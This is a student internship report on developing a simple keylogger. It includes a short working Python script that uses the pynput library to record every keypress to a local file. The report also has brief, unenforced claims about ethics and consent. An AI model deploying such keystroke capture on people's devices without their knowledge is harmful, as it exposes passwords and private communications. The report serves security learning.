# PRODIGY_CS_Task-04

# Project Title: Simple Keylogger Development

__Author:__ Berlin Shaju Bellarmin

__Date:__ 12/05/2024

# Introduction:

The Simple Keylogger Development project aimed to create a basic keylogger program that records and logs keystrokes. This report provides an overview of the project, including its objectives, implementation process, and outcomes.

# Project Overview:
The keylogger project focused on developing a program capable of capturing keystrokes in real-time and saving them to a file for analysis. The primary objectives were:

Develop functionality to capture keystrokes using Python.
Implement a mechanism to store the captured keystrokes in a file.
Ensure ethical considerations and permissions are addressed for keylogger usage.
Implementation Process:

# 1. Research and Planning:

Conducted research on keylogger implementation techniques, Python libraries, and ethical considerations.
Developed a plan outlining project objectives, requirements, and timeline.

# 2. Coding:

Utilized the pynput library in Python to capture keyboard input.
Implemented a function to write captured keystrokes to a file named keylog.txt.

# 3. Testing and Debugging:

Conducted thorough testing to validate the functionality and reliability of the keylogger.
Addressed any bugs or issues encountered during testing.

# 4. Documentation:

Documented the code implementation, including function descriptions, usage instructions, and ethical considerations.
Prepared a comprehensive report summarizing the project details and outcomes.

# Code Implementation:

```
from pynput.keyboard import Key, Listener

# Define the function to write keystrokes to a file
def on_press(key):
    with open("keylog.txt", "a") as f:
        f.write(str(key) + "\n")

# Create a listener instance
with Listener(on_press=on_press) as listener:
    listener.join()
```
    
# Description:

The code utilizes the __pynput__ library to capture keyboard input.
The __on_press__ function writes captured keystrokes to a file named __keylog.txt__.
A listener instance continuously monitors keyboard events.

__Ethical Considerations:__

Prioritized ethical considerations throughout the development process.
Ensured users were informed about the keylogger's usage and obtained necessary permissions.
Respected user privacy and data protection regulations.

__Outcome:__

The keylogger project was successfully completed, meeting all specified objectives. The program effectively captures and logs keystrokes, providing valuable insights into user activity. Ethical considerations were prioritized, ensuring compliance with relevant guidelines and regulations.

# Conclusion:

The Simple Keylogger Development project provided an opportunity to delve into keylogger implementation techniques and ethical considerations in cybersecurity. The project's successful completion demonstrates the ability to apply theoretical knowledge to practical problem-solving scenarios. Moving forward, I am eager to explore more cybersecurity projects and contribute to the field's advancements.
